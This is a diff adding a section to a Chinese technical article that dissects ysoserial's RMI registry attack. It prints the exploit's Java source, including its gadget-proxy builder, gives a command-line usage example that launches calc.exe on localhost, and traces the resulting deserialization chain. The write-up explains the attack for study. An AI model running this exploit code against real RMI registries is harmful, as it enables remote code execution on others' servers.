@@ -270,7 +270,9 @@ BadAttributeValueExpException val = new BadAttributeValueExpException(entry);
 
 ![](Ysoserial工具解读（六）\Server_rdobj.jpg)
 
-因为RCE肯定会执行到`BadAttributeValueExpException`的`ReadObject()`方法，所以在这里打了断点守着。从图中可以看出大致的调用过程：线程池ThreadPool收到连接请求后，对传输数据TCPTransport解析识别，并对其中的数据进行反序列化`UnicastRef.unmashalValue()`，最后经过`java.io`的层层调用，到达了恶意类的`ReadObject()`方法，后面的调用过程这里不再赘述。
+因为RCE肯定会执行到`BadAttributeValueExpException`的`ReadObject()`方法，所以在这里打了断点守着。
+
+从图中可以看出大致的调用过程：线程池ThreadPool收到连接请求后，对传输数据TCPTransport解析识别，并对其中的数据进行反序列化`UnicastRef.unmashalValue()`，最后经过`java.io`的层层调用，到达了恶意类的`ReadObject()`方法，后面的调用过程这里不再赘述。
 
 ### 攻击Server——方法2
 
@@ -278,7 +280,120 @@ BadAttributeValueExpException val = new BadAttributeValueExpException(entry);
 
 ### 攻击Registry
 
+其实，只要知道注册机的IP、端口，客户端也可以调用`bind()`函数绑定RMI对象，这也是存在这种攻击方式的原因。下面分析的攻击代码源自ysoserial工具的`exploit/RMIRegistryExploit`，主要代码如下：
 
+```java
+/**
+**	exploit/RMIRegistryExploit.java
+**/
+
+public static void main(final String[] args) throws Exception {
+    final String host = args[0];
+    final int port = Integer.parseInt(args[1]);
+    final String command = args[3];
+    Registry registry = LocateRegistry.getRegistry(host, port);
+    final String className = CommonsCollections1.class.getPackage().getName() +  "." + args[2];
+    final Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(className);
+
+    // 测试RMI registry连接状态
+    try {
+        registry.list();
+    } catch(ConnectIOException ex) {
+    // 如果失败升级为SSL连接
+        registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
+    }
+
+    // 确保exp不在构造函数或反序列化阶段触发
+    exploit(registry, payloadClass, command);
+}
+
+public static void exploit(final Registry registry,
+                           final Class<? extends ObjectPayload> payloadClass,
+                           final String command) throws Exception {
+    new ExecCheckingSecurityManager().callWrapped(new Callable<Void>(){public Void call() throws Exception {
+        ObjectPayload payloadObj = payloadClass.newInstance();
+        Object payload = payloadObj.getObject(command);
+        String name = "pwned" + System.nanoTime();
+        // 这里的createMap()创建了一个hashmap，键是"pwned+时间戳",值是payload
+        // createMemoitizedProxy()由上面的hashmap，创建一个Remote子类的代理对象
+        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
+        try {
+            // 调用bind()函数，触发后续反序列化调用
+            registry.bind(name, remote);
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+        Utils.releasePayload(payloadObj, payload);
+        return null;
+    }});
+}
+
+
+/**
+**	Gadgets.java
+**/
+public static Map<String, Object> createMap ( final String key, final Object val ) {
+    final Map<String, Object> map = new HashMap<String, Object>();
+    map.put(key, val);
+    return map;
+}
+
+public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
+    return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
+}
+
+public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
+    return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
+}
+
+public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
+    final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
+    allIfaces[ 0 ] = iface;
+    if ( ifaces.length > 0 ) {
+        System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
+    }
+    return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
+}
+```
+
+根据参数分析用法应该为：
+
+```powershell
+Usage:
+java -cp ysoserial-all-0.x.x.jar ysoserial.exploit.RMIRegistryExploit [targetIP] [port] [Payload] [cmd]
+Example:
+java -cp target\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 5599 CommonsCollections2 "calc.exe"
+```
+
+利用成功的条件是RMIregistry所在的主机有CommonsCollections2执行需要的类。因为RMI registry经常和RMI server设置于同一台服务器上，所以攻击它也能达到攻击服务器的目的。
+
+分析以上过程，payloadClass由命令行参数2决定，这里是CommonsCollections2。于是主函数初始化了它的实例，并`getObject(command)`生成了payload（PriorityQueue -> TransformingComparator  -> InvokerTransformer -> ...）；在得到payload后现将它存入一个hashmap，再用`createMemoizedInvocationHandler(hashmap, Remote.class)`生成一个Remote接口的代理类。通过`bind()`函数将这个代理类发送给注册机反序列化。
+
+注册机在收到序列化数据后的处理过程如下图，前面的从线程池接受请求到TCPTransport处理请求的过程这里不再详述，如果想知道细节，可以读这篇→[https://xz.aliyun.com/t/2223 ]()，其中`“RMI Server 的 RegistryImpl”`章节详细分析了服务端注册表的`bind()`过程。
+
+![](Ysoserial工具解读（六）\server_registry.jpg)
+
+这里分析的是中间的过程，看调用栈可知`RegistryImpl_Skel`的`dispatch()`方法调用了开启了`readObject()`，反序列化得到第一个类是`AnnotationInvocationHandler`，它的`readObject()`方法：
+
+```java
+/**
+**	AnnotationInvocationHandle`.java
+**/
+
+private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+    var1.defaultReadObject();
+    AnnotationType var2 = null;
+    
+	// ****	SNIP	****
+```
+
+`var1`的`defaultReadObject()`反序列化出了代理类的Hashmap对象，该对象的key-value又分别反序列化，如图：
+
+![](Ysoserial工具解读（六）\defaultReadObject.jpg)
+
+value在反序列化时就引发了后面的调用过程（PriorityQueue -> TransformingComparator  -> InvokerTransformer -> ...），如下： P.S.详见Ysoserial工具解读（二）。
+
+![](Ysoserial工具解读（六）\Server_registry2.jpg)
 
 ### 攻击Client
 
